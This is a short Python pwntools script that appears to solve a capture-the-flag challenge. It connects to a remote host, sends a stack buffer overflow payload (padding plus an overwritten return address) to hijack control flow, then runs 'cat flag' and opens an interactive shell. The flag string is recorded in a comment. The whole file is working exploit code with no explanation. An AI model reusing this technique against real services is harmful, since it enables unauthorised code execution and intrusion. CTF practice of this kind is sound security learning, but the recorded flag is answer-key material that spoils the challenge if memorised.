from pwn import *

r = remote('140.110.112.218', 2118)

r.sendline(b'a'*0x38 + p64(0x004006b6))
r.recvuntil(":)")
r.sendline("cat flag") # BreakAllCTF{G00d_j0000000000b:)}
r.interactive()